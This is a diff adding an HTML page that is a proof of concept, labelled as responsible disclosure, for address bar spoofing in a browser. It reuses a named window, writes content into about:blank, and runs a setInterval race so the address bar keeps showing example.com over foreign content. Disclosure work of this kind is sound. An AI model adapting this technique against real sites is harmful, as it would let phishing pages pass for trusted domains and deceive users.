@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Address Bar Spoofing Demo</title>
+</head>
+
+<body>
+  <h3>Address Bar Spoofing – PoC (Responsible Disclosure)</h3>
+  <button onclick="startSpoof()">Run Demo</button>
+
+<script>
+let w;
+
+function startSpoof() {
+  /*
+   * Step 1:
+   * Open a named window and immediately point it to a trusted-looking URL
+   */
+  window.open("https://example.com", "spoofwin");
+
+  /*
+   * Step 2:
+   * Reuse the same window name before navigation is committed
+   */
+  w = window.open("about:blank", "spoofwin");
+
+  /*
+   * Step 3:
+   * Inject attacker-controlled content
+   */
+  w.document.write(`
+    <h2 style="color:red">⚠ SPOOF DEMO</h2>
+    <p>
+      Address bar shows <b>example.com</b><br>
+      But this content is <b>NOT</b> from example.com
+    </p>
+  `);
+
+  /*
+   * Step 4:
+   * Keep the navigation in an unstable state (race condition)
+   */
+  setInterval(raceNavigation, 0);
+}
+
+function raceNavigation() {
+  try {
+    // Touch cross-origin property to trigger timing edge-case
+    w.location.href !== "about:blank";
+  } catch (e) {
+    // Force a benign redirect to keep document from settling
+    w.location.href = "about:blank";
+  }
+}
+</script>
+</body>
+</html>
